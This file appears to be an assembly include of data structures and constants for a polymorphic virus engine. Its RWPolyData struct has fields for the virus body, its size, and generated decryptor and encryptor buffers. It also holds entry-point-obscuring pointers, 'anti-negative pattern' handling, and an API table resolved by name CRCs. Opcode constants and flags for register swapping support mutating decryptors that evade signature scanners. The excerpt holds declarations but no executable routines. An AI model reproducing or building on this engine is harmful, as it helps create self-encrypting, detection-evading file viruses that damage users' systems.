VirtualAllocAPI Proto :DWord,:DWord,:DWord,:DWord

;ReadWrite Structure
;--------------

MAX_NUMBER_OF_APIS	Equ 17

PLACE_IN_MEMORY Struct
	VA 		DD ?
	nSize	DD ?
PLACE_IN_MEMORY EndS

API	Struct
	CRCName	DD	?
	VA		DD	?
	nParams	DB	?
	Regs 	DB 	?
	nResult	DB 	?
	Param1	DB	?
	Param2	DB	?
	Param3	DB	?
	Param4	DB	?
API EndS

RWPolyData Struct
	DecryptPtrs 	PLACE_IN_MEMORY 30H Dup(<>)			;place for host key Table for decryptor
	EncryptPtrs 	PLACE_IN_MEMORY 30H Dup(<>)			;place for host key Table for encryptor
	NumOfEntries 	DB	?
	DataSectionRVA	DD	?					;
	DataSectionSize	DD	?
	APIsFound		DB 	?
	AvariableAPIs 	API MAX_NUMBER_OF_APIS+1 Dup(<>)
	NumOfStrings 	DD	?
	Strings			PLACE_IN_MEMORY	0AH Dup(<>)
	VirusSize		DD	?
	DecryptorRVA	DD	?								;the real place of the Decryptor (important for API calls)
	SizeOfDecryptor	DD	?
	AffectedRegs	DB	?								;a byte indicate what the registers used (important for getValidReg())
	AffectedVars	DB	?								;th same but for local variables (important for getting the max local variables used in the decryptor)
	NumOfRegs		DB	?								;the number of registers used by the decryptor Algorithms
	UsedRegs		DB 	8 	Dup(<>)						;the registers used by the decryptor Algorithms
	Decryptor		DB 	4096 Dup (<>)					;the place where the decryptor will be placed
	EncryptorPtr	DD	?								;this is the pointer to last byte written in the encryptor
	Encryptor		DB 1024	Dup (<>)					;the place where the encryptor will be placed
	Temp			DB 100H	Dup (<>)					; a temporary place
	GarManglo		DD 100H	Dup (<>)					;this is a place for manglo proc( will be explianed in more detail in Manglo Proc)
	VirusPtr		DD 	?								;the pointer to the encrypted Virus
	VirusOffset		DD	?								;the pointer to the virus to encrypt (with the FileHandler not RVA)
	EncryptorTemp	DB 100H	Dup (<>)					;that's where the encryptor will be placed temporary
	TableCount		DB 	?								; the number of elements in DecryptPtrs
	IFOrder			DB	?								;this for if inside another if
	nLocalVars		DB	?								;the number of local variables in the program
	EpoPointer		DD 	?								;this place related to blocks of code epo .. it's the pointer to EpoData (will be used in negative pattern)
	FileHandler		DD	?								;only used in anti-negative pattern
RWPolyData EndS

;Constants:
;----------
;LAE
;----
;Flags
;-----
REG_EAX  Equ 0
REG_ECX  Equ 1
REG_EDX  Equ 2
REG_EBX  Equ 3
REG_ESP  Equ 4
REG_EBP  Equ 5
REG_ESI  Equ 6
REG_EDI  Equ 7
REG_AL	 Equ 0
REG_CL	 Equ 1
REG_DL	 Equ 2
REG_BL   Equ 3
REG_AH   Equ 4
REG_CH	 Equ 5
REG_DH	 Equ 6
REG_BH	 Equ 7
BITS8    Equ 00000000000000000000000000000001B
BITS16   Equ 00000000000000000000000000000010B
BITS32   Equ 00000000000000000000000000000100B
R_R	     Equ 00000000000000000000000001000000B
RM_R     Equ 00000000000000000000000010000000B
R_RM     Equ 00000000000000000000000100000000B
R_IMM    Equ 00000000000000000000001000000000B
RM_IMM   Equ 00000000000000000000010000000000B
RM_NUL   Equ 00000000000000000000100000000000B
OFF_AL   Equ 00000000000000000001000000000000B
AL_OFF   Equ 00000000000000000010000000000000B
RM_REG   Equ 00000000000000000100000000000000B
RM_NOREG Equ 00000000000000001000000000000000B
RM_ADDR  Equ 00000000000000010000000000000000B
REL_ADDR Equ 00000000000000100000000000000000B
ONLY_REG Equ 00000000000001000000000000000000B
ONLY_RM  Equ 00000000000010000000000000000000B
ONLY_IMM Equ 00000000000100000000000000000000B
;---------
;State *1*
;---------
ASM_ADD  Equ 00H
ASM_OR   Equ 01H
ASM_AND  Equ 04H
ASM_SUB  Equ 05H
ASM_XOR  Equ 06H
ASM_CMP  Equ 07H
;---------
;State *2*
;---------
ASM_INC  Equ 08H
ASM_DEC  Equ 09H
ASM_NOT  Equ 0AH
ASM_NEG  Equ 0BH
ASM_MUL  Equ 0CH
ASM_IMUL Equ 0DH
ASM_DIV  Equ 0EH
ASM_IDIV Equ 0FH
;---------
;State *3*
;---------
ASM_ROL  Equ 10H
ASM_ROR  Equ 11H
ASM_SHL  Equ 14H
ASM_SHR  Equ 15H
;---------
;State *4*
;---------
ASM_JB   Equ 18H
ASM_JAE  Equ 19H
ASM_JZ	 Equ 1AH
ASM_JNZ  Equ 1BH
ASM_JBE  Equ 1CH
ASM_JA	 Equ 1DH
;---------
;State *5*
;---------
ASM_CALL Equ 20H
ASM_JMP  Equ 21H
;---------
;State *6*
;---------
ASM_PUSH Equ 28H
ASM_POP  Equ 29H
;---------
;State *7*
;---------
ASM_PUSHAD Equ 30H
ASM_POPAD  Equ 31H
;---------
;State *8*
;---------
ASM_STOSB Equ 38H
ASM_STOSD Equ 39H
ASM_LODSB Equ 3AH
ASM_LODSD Equ 3BH
ASM_STOSW Equ 3CH
ASM_LODSW Equ 3DH
;--------------
;Special cases
;--------------
ASM_MOV  Equ 40H
ASM_TEST Equ 41H
ASM_LEAVE Equ 42H
ASM_RET   Equ 43H
ASM_LEA   Equ 44H
ASM_BSWAP Equ 45H
ASM_XCHG  Equ 46H
ASM_NOP   Equ 47H
;---
;----------------------end of LAE Data
;EAGLE Constants:
;----------------
NO_REGRESERVE		Equ 1H
NO_NEGATIVEPATTERN	Equ 2H
NO_REGSWAPPING		Equ 4H
